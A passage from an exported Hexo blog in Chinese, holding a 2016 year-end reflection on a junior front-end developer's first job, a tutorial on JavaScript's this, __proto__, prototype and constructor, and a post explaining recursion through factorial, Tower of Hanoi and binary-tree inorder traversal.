<p>七月份正式开始了职业生涯，实习期坐了一个月板凳，公司缺乏相应的技术人员，大部分人都是产品，但我觉得，我才毕业，一定有什么地方需要学习。虽然我被安排搞了JS，但是，我觉得没问题，刚好也想看看，顺便学了。一开始，做的业务简单，使用基本的JS操作就够用了，JS不像Java那样的类设计，最简单从上向下写加上部分封装就够用了。<br><br>八月份，被调去厂家学习，虽然只有3个人的技术，但是人都很不错，看到同龄的小伙子没有上大学走的培训，心里很复杂，一是觉得他很厉害了，二是觉得对不起我的大学了。没事，继续学，学了很多业务上的东西。公司的业务也接触了差不多了。基本的HTML+css+JS已经没什么问题了。<br><br>九月份，经历了G20峰会，闲了一个周。这期间：</p>
<ol>
<li><p>连同七八月份的零星时间，在github上放了个人主页，用Hexo建了一个博客；</p>
</li>
<li><p>买了一个个人vps，方便外出看看，在上面搭了一个Apache，顺便研究下linux和apache；</p>
</li>
<li><p>开始刷LeetCode，感觉这些问题很有意思，其实很像工作上的业务需求。</p>
</li>
</ol>
<p>一直到九月底，我已经在厂家呆了两个月了，做了六个小项目，用了公司的fw框架，或者用自己写的JS代码。<br><br>十月份回了本部，开始接手宾馆模板业务，增加宾馆模板，按照需求修改模板，改bug，接手到了月底。<br><br>10月26被外派到了湖州开发云梯4.0项目，发现什么都没有，开发就俩，想了下，嗯，前端开发也够了，努力搞完我还想回杭州呢，搞了10天，完成4个小Demo，当地开发还是机智，利用了爬虫，对于新闻这种需要维护的麻烦不讨好的交给了别人，我们爬取就好了。技术上：</p>
<ol>
<li><p>习得流式布局，以前由于电视适配问题，一直用的最简单的绝对定位。给页面加特效。</p>
</li>
<li><p>JQuery的使用。</p>
</li>
<li><p>Json是什么，怎么用。</p>
</li>
<li><p>对于fw这个框架有了更深刻的理解，现在已经可以看懂了。</p>
</li>
</ol>
<p>11月4号搞定回到了本部，告知我没有数据库，只有数据，要我做个页面展示，动态的。ok，利用json搞定。<br><br>后面的话，基本上慢慢转移宾馆业务到我的手上。<br><br>一直到12月10号左右开始交接bug或者说问题处理时，我才发现这是个对我来说的大坑，我交际弱，一开始，我有点不太想去大电话，但到了你的脸上，也只能去问了，我总结了几点：</p>
<ol>
<li><p>和陌生人交流要有礼貌，因为，毕竟你给别人打，只要能问出结果，那么其实是你的成功，多几句礼貌用语又有何妨。</p>
</li>
<li><p>总有人踢足球，我不信你还能踢回去，总有人能帮你解决，就怕你这足球没气了。</p>
</li>
<li><p>有些问题，不是你的问题，可能是多方面的原因或者说这个体制就是问题，失败了可能已是必然的，那为什么还要继续前行？因为没有什么能让我后退，大不了我就适时放弃。</p>
</li>
</ol>
<p>12月底抢了回家的票，感受到了春运，看到了知乎的评论，感受到了计算机不能从技术直接拯救中国。。<br><br>给胡总过完生日已是2017年1月1号，我去打了一天dota2，毕竟玩了八年。想一想，ze dong 没玩了，因为他最后去了清华，那里应该有他更值得付出的东西。LY没玩了，因为，对于他这种老玩家，游戏是带来娱乐的，不是上分的痛苦。zs没玩了，毕竟只是个游戏，他肯定不会在一个娱乐的游戏上投入太多；人杰没玩了，他去打了英雄联盟，估计应该钻石了。<br><br>剩下一帮大学舍友过来坑我，简直太困难了。但是，我还是想说一句，我如果还要打，我要上5000分，才对得起我这8年dota生涯啊。</p>
</blockquote>
<p>我还是喜欢阿甘的大智若愚和安迪20年的坚持，同时，也感慨《面对巨人》里，4倍于自身的定位。我觉至少这就是我2017年的目标，努力提升自己，看到更好的世界！</p>
]]></content>
      <tags>
        <tag>2016</tag>
      </tags>
  </entry>
  <entry>
    <title>JS的this、__proto__ 和. prototype 、constructor</title>
    <url>/2016/12/22/JS%E7%9A%84this%E3%80%81__proto__%20%E5%92%8C.%20prototype%20%E3%80%81constructor/</url>
    <content><![CDATA[<h2 id="一、this关键字"><a href="#一、this关键字" class="headerlink" title="一、this关键字"></a>一、this关键字</h2><h3 id="作为函数被调用"><a href="#作为函数被调用" class="headerlink" title="作为函数被调用"></a>作为函数被调用</h3><blockquote>
<p>函数也可以直接被调用，此时 this 绑定到全局对象。在浏览器中，window 就是该全局对象。比如下面的例子：函数被调用时，this 被绑定到全局对象，接下来执行赋值语句，相当于隐式的声明了一个全局变量，这显然不是调用者希望的。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeNoSense</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">	<span class="keyword">this</span>.x = x; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">makeNoSense(<span class="number">5</span>); </span><br><span class="line">x;<span class="comment">// x 已经成为一个值为 5 的全局变量</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="作为对象方法调用"><a href="#作为对象方法调用" class="headerlink" title="作为对象方法调用"></a>作为对象方法调用</h3><blockquote>
<p>在 JavaScript 中，函数也是对象，因此函数可以作为一个对象的属性，此时该函数被称为该对象的方法，在使用这种调用方式时，this 被自然绑定到该对象。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> point = &#123; </span><br><span class="line">x : <span class="number">0</span>, </span><br><span class="line">y : <span class="number">0</span>, </span><br><span class="line">	moveTo : <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123; </span><br><span class="line">		<span class="keyword">this</span>.x = <span class="keyword">this</span>.x + x; </span><br><span class="line">		<span class="keyword">this</span>.y = <span class="keyword">this</span>.y + y; </span><br><span class="line">	&#125; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">point.moveTo(<span class="number">1</span>, <span class="number">1</span>)<span class="comment">//this 绑定到当前对象，即 point 对象</span></span><br></pre></td></tr></table></figure>
<p><strong>内部函数再定义内部函数</strong></p>
<p>上述的moveTo()函数已经是point的内部函数了，如果，我还想在moveTo中再加入一个函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> point = &#123; </span><br><span class="line">	x : <span class="number">0</span>, </span><br><span class="line">	y : <span class="number">0</span>, </span><br><span class="line">	moveTo : <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">//point对象</span></span><br><span class="line">		<span class="comment">// 内部函数</span></span><br><span class="line">		<span class="keyword">var</span> moveX = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">//window对象</span></span><br><span class="line">		<span class="keyword">this</span>.x = x;<span class="comment">//this 绑定到了哪里？</span></span><br><span class="line">	&#125;; </span><br><span class="line">	<span class="comment">// 内部函数</span></span><br><span class="line">	<span class="keyword">var</span> moveY = <span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>&#123; </span><br><span class="line">		<span class="keyword">this</span>.y = y;<span class="comment">//this 绑定到了哪里？</span></span><br><span class="line">	&#125;; </span><br><span class="line"></span><br><span class="line">	moveX(x); </span><br><span class="line">	moveY(y); </span><br><span class="line">	&#125; </span><br><span class="line">&#125;; </span><br><span class="line">point.moveTo(<span class="number">1</span>, <span class="number">1</span>); </span><br><span class="line">point.x; <span class="comment">//==&gt;0</span></span><br><span class="line">point.y; <span class="comment">//==&gt;0</span></span><br><span class="line">x; <span class="comment">//==&gt;1</span></span><br><span class="line">y; <span class="comment">//==&gt;1</span></span><br></pre></td></tr></table></figure>
<p>这里出现了一个错误，第一个this显示出是point对象，但是第二个this却显示出是window对象。</p>
<blockquote>
<p>这属于 JavaScript 的设计缺陷，正确的设计方式是内部函数的 this 应该绑定到其外层函数对应的对象上，为了规避这一设计缺陷，聪明的 JavaScript 程序员想出了变量替代的方法，约定俗成，该变量一般被命名为 that。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> point = &#123; </span><br><span class="line">	x : <span class="number">0</span>, </span><br><span class="line">	y : <span class="number">0</span>, </span><br><span class="line">	moveTo : <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123; </span><br><span class="line">		<span class="keyword">var</span> that = <span class="keyword">this</span>; </span><br><span class="line">		<span class="comment">// 内部函数</span></span><br><span class="line">		<span class="keyword">var</span> moveX = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">			that.x = x; </span><br><span class="line">		&#125;; </span><br><span class="line">		<span class="comment">// 内部函数</span></span><br><span class="line">		<span class="keyword">var</span> moveY = <span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>&#123; </span><br><span class="line">			that.y = y; </span><br><span class="line">		&#125; </span><br><span class="line">		moveX(x); </span><br><span class="line">		moveY(y); </span><br><span class="line">	&#125; </span><br><span class="line">&#125;; </span><br><span class="line">point.moveTo(<span class="number">1</span>, <span class="number">1</span>); </span><br><span class="line">point.x; <span class="comment">//==&gt;1 </span></span><br><span class="line">point.y; <span class="comment">//==&gt;1</span></span><br></pre></td></tr></table></figure>
<p>当内部函数嵌套只有一层，那么还是符合<code>内部函数this绑定在外层函数对应的对象上</code>，但是，如果超过了1层嵌套，那么在高于1层的内部函数中，this对象如果不借助that，那么this将会指向window对象。</p>
<h3 id="apply或call调用"><a href="#apply或call调用" class="headerlink" title="apply或call调用"></a>apply或call调用</h3><p>﻿<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>)</span>&#123; </span><br><span class="line">	<span class="keyword">this</span>.x = x; </span><br><span class="line">	<span class="keyword">this</span>.y = y; </span><br><span class="line">	<span class="keyword">this</span>.moveTo = <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>)</span>&#123; </span><br><span class="line">	    <span class="keyword">this</span>.x = x; </span><br><span class="line">	    <span class="keyword">this</span>.y = y; </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">0</span>, <span class="number">0</span>); </span><br><span class="line"><span class="keyword">var</span> p2 = &#123;<span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span>&#125;; </span><br><span class="line">p1.moveTo(<span class="number">1</span>, <span class="number">1</span>); </span><br><span class="line">p1.moveTo.apply(p2, [<span class="number">10</span>, <span class="number">10</span>]);</span><br></pre></td></tr></table></figure></p>
<p>这里p1是一个<code>Point {x: 1, y: 1}</code>对象，而p2则是一个<code>Object {x: 10, y: 10}</code>对象。</p>
<h3 id="eval调用"><a href="#eval调用" class="headerlink" title="eval调用"></a>eval调用</h3><blockquote>
<p>JavaScript 中的 eval 方法可以将字符串转换为 JavaScript 代码，使用 eval 方法时，this 指向哪里呢？答案很简单，看谁在调用 eval 方法，调用者的执行环境（ExecutionContext）中的 this 就被 eval 方法继承下来了。</p>
</blockquote>
<h2 id="二、proto-和-prototype"><a href="#二、proto-和-prototype" class="headerlink" title="二、proto 和. prototype"></a>二、<strong>proto</strong> 和. prototype</h2><blockquote>
<p>p.<strong>proto</strong> === p.constructor.prototype === Person.prototype;</p>
</blockquote>
<p><strong>一、 所有构造器/函数的<strong>proto</strong>都指向Function.prototype，它是一个空函数（Empty function）</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">A.__proto__ === <span class="built_in">Function</span>.prototype; <span class="comment">//true</span></span><br><span class="line"><span class="comment">//内置对象</span></span><br><span class="line"><span class="built_in">Number</span>.__proto__ === <span class="built_in">Function</span>.prototype  <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>特殊的，如Math对象的<em>proto</em>是Object.prototype</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.__proto__ === <span class="built_in">Object</span>.prototype  <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>知道了所有构造器（含内置及自定义）的<strong>proto</strong>都是Function.prototype，那Function.prototype的<strong>proto</strong>是谁呢？<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.__proto__ === <span class="built_in">Object</span>.prototype;<span class="comment">//true</span></span><br></pre></td></tr></table></figure></p>
<p>这说明所有的构造器也都是一个普通JS对象，可以给构造器添加/删除属性等。同时它也继承了Object.prototype上的所有方法：toString、valueOf、hasOwnProperty等。</p>
</blockquote>
<p>最后Object.prototype的<strong>proto</strong>是谁？</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.__proto__ === <span class="literal">null</span>  <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p><strong>二、所有对象的<strong>proto</strong>都指向其构造器的prototype</strong></p>
<p><code>__proto__</code>指向了，我不知道怎么说，用java的话来说就是class类。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">name</span>: <span class="string">'jack'</span>&#125;</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/hello/g</span></span><br><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span></span><br><span class="line"><span class="keyword">var</span> err = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'exception'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">console</span>.log(obj.__proto__ === <span class="built_in">Object</span>.prototype) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(arr.__proto__ === <span class="built_in">Array</span>.prototype)  <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(reg.__proto__ === <span class="built_in">RegExp</span>.prototype) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(date.__proto__ === <span class="built_in">Date</span>.prototype)  <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(err.__proto__ === <span class="built_in">Error</span>.prototype)  <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>再看看自定义的构造器，这里定义了一个Person</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Person(<span class="string">'jack'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(p.__proto__ === Person.prototype) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>p是Person的实例对象，p的内部原型总是指向其构造器Person的prototype。</p>
</blockquote>
<p>每个对象都有一个constructor属性，可以获取它的构造器，因此以下打印结果也是恒等的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Person(<span class="string">'jack'</span>)</span><br><span class="line">p.__proto__ === p.constructor.prototype</span><br></pre></td></tr></table></figure>
<h3 id="修改原型"><a href="#修改原型" class="headerlink" title="修改原型"></a>修改原型</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Person(<span class="string">'jack'</span>)</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">	getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>又由于</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">p.__proto__ === p.constructor.prototype === Person.prototype;</span><br></pre></td></tr></table></figure>
<p>所以，我觉得有三种写法。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Person.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> per = <span class="keyword">new</span> Person(<span class="string">'jack'</span>);</span><br><span class="line">per.__proto__.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">per.constructor.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="三、constructor属性"><a href="#三、constructor属性" class="headerlink" title="三、constructor属性"></a>三、constructor属性</h2><blockquote>
<p>返回一个指向创建了该对象原型的函数引用。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a,b;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">A</span> (<span class="params">arg1,arg2</span>) </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.a = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">this</span>.b=<span class="number">2</span>; </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	A.prototype.log = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">	&#125;</span><br><span class="line">	a = <span class="keyword">new</span> A();</span><br><span class="line">	b = <span class="keyword">new</span> A();</span><br><span class="line">&#125;)()</span><br><span class="line">a.log();</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line">b.log();</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>通过以上代码我们可以得到两个对象，a,b，他们同为类A的实例。因为A在闭包里，所以现在我们是不能直接访问A的，那如果我想给类A增加新方法怎么办？</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// a.constructor.prototype 在chrome,firefox中可以通过 a.__proto__ 直接访问</span></span><br><span class="line">a.constructor.prototype.log2 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">this</span>.b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a.log2();</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line">b.log2();</span><br><span class="line"><span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>由于闭包的特性，我们只能借助<code>a.constructor.prototype</code>来更改原型。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.ibm.com/developerworks/cn/web/1207_wangqf_jsthis/" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/web/1207_wangqf_jsthis/</a><br><a href="http://www.cnblogs.com/snandy/archive/2012/09/01/2664134.html" target="_blank" rel="noopener">http://www.cnblogs.com/snandy/archive/2012/09/01/2664134.html</a><br><a href="http://stackoverflow.com/questions/9959727/proto-vs-prototype-in-javascript" target="_blank" rel="noopener">http://stackoverflow.com/questions/9959727/proto-vs-prototype-in-javascript</a></p>
]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>写写我理解的递归</title>
    <url>/2016/12/15/%E5%86%99%E5%86%99%E6%88%91%E7%90%86%E8%A7%A3%E7%9A%84%E9%80%92%E5%BD%92/</url>
    <content><![CDATA[<h1 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h1><h2 id="阶乘"><a href="#阶乘" class="headerlink" title="阶乘"></a>阶乘</h2><p>先用一个例子说明：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> result = n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i = n<span class="number">-1</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">	result *= i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面使用循环实现了一个阶乘计算。如何换成递归呢？</p>
<a id="more"></a>
<p>如何求<code>3</code>的阶乘？</p>
<blockquote>
<p>答：需要求<code>2</code>的阶乘，再乘<code>3</code>。</p>
</blockquote>
<p>如何求<code>2</code>的阶乘？</p>
<blockquote>
<p>答：需要求<code>1</code>的阶乘，再乘<code>2</code>。</p>
</blockquote>
<p>如何求<code>1</code>的阶乘？</p>
<blockquote>
<p>答：需要求<code>1</code>的阶乘，<code>1</code>的阶乘就是1。</p>
</blockquote>
<p>这上面的都是重复的，让我们来考虑复杂点的：</p>
<p>如何求<code>n</code>的阶乘？</p>
<blockquote>
<p>如果值不是<code>1</code>，你就必须让<code>n</code>和<code>n-1</code>的阶乘相乘，可以简写成<code>n! = n(n − 1)!</code> 或者<code>n * f(n-1)</code>，f(n-1)就是n-1的阶乘的数学写法。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> n*factorial(n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>当然，这两种方法求阶乘对于我们都能理解，可以理解为局部循环和函数循环，但都达到了一目的。</p>
<p><strong>2017-04-27</strong></p>
<blockquote>
<p>前两天看了代码大全，作者表示用递归来计算阶乘是一件sb的事情，不过我仔细思考了下，作为当时初次理解递归思路，这个例子还是可以接受的。不过他的开销确实不如循环。</p>
</blockquote>
<p>引自wiki百科(<a href="https://zh.wikipedia.org/wiki/%E9%80%92%E5%BD%92_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6)" target="_blank" rel="noopener">递归</a>)：</p>
<blockquote>
<p>计算理论可以证明递归的作用可以完全替换循环。</p>
</blockquote>
<h2 id="汉诺塔"><a href="#汉诺塔" class="headerlink" title="汉诺塔"></a>汉诺塔</h2><p>不太清楚怎么做的，可以先玩下游戏，然后再去实现。</p>
<p><img src="http://i.imgur.com/AZoEtiC.jpg" alt></p>
<p>假设有3个盘子，如何把这些盘子从左边柱子上，借助中间柱子移动到最右边？</p>
<blockquote>
<p>需要将最上层两个盘子移动到中间柱子，然后将最下面的盘子移动到最右边，再将中间的两个盘子移动到最右边。</p>
</blockquote>
<p>如何移动两个盘子？</p>
<blockquote>
<p>需要将上面的盘子移动到中间的柱子，将第二个（底下的）盘子移动到目标盘子。</p>
</blockquote>
<p>如果只有一个盘子？</p>
<blockquote>
<p>直接移动盘子到目标柱子。</p>
</blockquote>
<p><img src="http://i.imgur.com/Id8S7Y5.gif" alt><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hanoi</span>(<span class="params">disc , src , mid , dst</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(disc &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		hanoi(disc<span class="number">-1</span> , src , dst , mid);</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"Move the "</span>+disc+<span class="string">" from "</span>+src+<span class="string">" to "</span>+dst);</span><br><span class="line">		hanoi(disc<span class="number">-1</span> , mid , src ,dst);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">hanoi(<span class="number">3</span>,a,b,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">//Move the 1 from src to dst</span></span><br><span class="line"><span class="comment">//Move the 2 from src to mid</span></span><br><span class="line"><span class="comment">//Move the 1 from dst to mid</span></span><br><span class="line"><span class="comment">//Move the 3 from src to dst</span></span><br><span class="line"><span class="comment">//Move the 1 from mid to src</span></span><br><span class="line"><span class="comment">//Move the 2 from mid to dst</span></span><br><span class="line"><span class="comment">//Move the 1 from src to dst</span></span><br></pre></td></tr></table></figure></p>
<p><strong>分析：</strong></p>
<p>盘子数不能小于1。</p>
<ol>
<li>想要移动n个盘子，需要把上面的n-1个盘子移动到辅助柱子上，然后移动最底下的盘子到目标，最后，把辅助柱子上的盘子移动到目标柱子。</li>
<li><p>如果递归想不通，那么思考下循环，谁是第一个被移动的盘子（假设最底下是3号盘子）？</p>
<ul>
<li><p>想移动3号盘子，需要移动2号盘子，想移动2号，盘子，需要移动1号盘子。所以在递归中，1号盘子先被移动。</p>
</li>
<li><p>1号盘子先被移动到那个柱子上呢？玩游戏我发现，单数盘子想要移动到目标柱子上，需要最顶层的盘子（1号盘子）先移动到目标柱子上；如果是双数盘子，则需要最顶层的盘子先移动到辅助柱子上。所以，到底1号盘子被先移动到那个柱子上，和盘子数有关。</p>
</li>
<li><p>从算法中我们亦可以看到，hanoi(disc-1 , src , dst , mid);交换了目标柱子和辅助柱子，如果disc为偶数，则1号（最顶层的）移动到了中间柱子(mid)；如果disc为奇数，则1号盘子移动到了目标柱子(dst)。</p>
</li>
</ul>
</li>
<li><p>画出移动盘子的树形图</p>
</li>
</ol>
<p><img src="http://i.imgur.com/g87rGYm.png" alt></p>
<p>这不就是中序遍历。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//Definition for a binary tree node.</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">TreeNode</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">     <span class="keyword">this</span>.val = val;</span><br><span class="line">     <span class="keyword">this</span>.left = <span class="keyword">this</span>.right = <span class="literal">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="keyword">var</span> inorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = [];</span><br><span class="line">    <span class="keyword">var</span> help = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root===<span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        help(root.left);</span><br><span class="line">        result.push(root.val);</span><br><span class="line">        help(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">    help(root);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//对于这样一个二叉树(nu 是null)</span></span><br><span class="line"></span><br><span class="line">		       <span class="number">1</span></span><br><span class="line">		   /       \</span><br><span class="line">		  <span class="number">2</span>          <span class="number">3</span></span><br><span class="line">		/   \      /   \</span><br><span class="line">	   <span class="number">4</span>    nu3    <span class="number">5</span>     nu6</span><br><span class="line">	  / \         / \   </span><br><span class="line">	 nu1 nu2     nu4 nu5</span><br></pre></td></tr></table></figure>
<p>分析：</p>
<pre><code>help(值为1的节点);
help(值为2的节点)
help(值为4的节点);
help(值为nu1的节点);return;
result.add(4);
help(值为nu2的节点);return;
result.add(2);
help(值为nu3的节点);return;
result.add(1);
help(值为3的节点);
help(值为5的节点);
help(值为nu4的节点);return;
result.add(5);
help(值为nu5的节点);return;
result.add(3);
help(值为nu6的节点);return;
函数运行完毕。
</code></pre><p>这里，我们通过一个result变量来维持结果集，所有的子问题都返回结果给result变量。</p>
<p>我们想要得到这棵树的中序遍历，我们并没有上来就获取root的值，而是：</p>
<ol>
<li>不停地访问他的左节点，直到null为止，然后获取最近的父节点的值。</li>
<li>然后再按照步骤1访问它的右节点。</li>
</ol>
<p>这就是递归的力量：要想做整体的事情，只需要知道整体中一部分的解决办法就可以了（要知道何时停止）。</p>
<h2 id="尾递归"><a href="#尾递归" class="headerlink" title="尾递归"></a>尾递归</h2><p>再补充最后一个点，刚好还是一个尾递归。</p>
<p>像之前的递归阶乘就是一种尾递归。</p>
<p>摘自wiki：</p>
<blockquote>
<p>尾调用的重要性在于它可以不在调用栈上面添加一个新的堆栈帧——而是更新它，如同迭代一般。尾递归因而具有两个特征：<br></p>
<ol>
<li>调用自身函数(Self-called)；<br><br>2.计算仅占用常量栈空间(Stack Space)。<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Definition for a binary tree node.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TreeNode</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">	 <span class="keyword">this</span>.val = val;</span><br><span class="line">	 <span class="keyword">this</span>.left = <span class="keyword">this</span>.right = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//二叉树求和</span></span><br><span class="line"><span class="keyword">var</span> sumNode = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(root===<span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> root.val + sumNode(root.left) + sumNode(root.right);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>recursion</tag>
      </tags>
  </entry>
  <entry>
    <title>编程语言分类</title>
